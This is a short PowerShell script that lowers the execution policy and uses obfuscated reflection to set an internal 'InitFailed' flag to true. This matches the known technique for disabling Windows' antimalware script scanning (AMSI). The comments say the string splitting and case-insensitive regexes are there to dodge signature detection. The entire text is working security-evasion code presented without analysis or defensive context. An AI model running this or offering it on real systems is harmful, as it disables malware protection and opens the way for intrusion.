Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted

# Split strings and use alternate methods for reflection
$typesMethod = [string]::Join('',('Get' + 'Types'));
$fieldsMethod = [string]::Join('',('Get' + 'Fields'));
$setValueMethod = [string]::Join('',('Set' + 'Value'));
$bindingFlags = [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static;

# Retrieve types from the current assembly
$assembly = [Ref].Assembly;
$types = $assembly.$typesMethod();

# Locate the iUtils class obfuscated
foreach ($type in $types) { 
    if ($type.Name -match '[iI][uU][tT][iI][lL][sS]') { 
        $targetType = $type; 
        break; 
    } 
}

# Locate and modify the iInitFailed field obfuscated
foreach ($field in $targetType.$fieldsMethod($bindingFlags)) { 
    if ($field.Name -match '[iI][iI][nN][iI][tT][fF][aA][iI][lL][eE][dD]') { 
        $field.$setValueMethod($null, $true); 
    } 
}
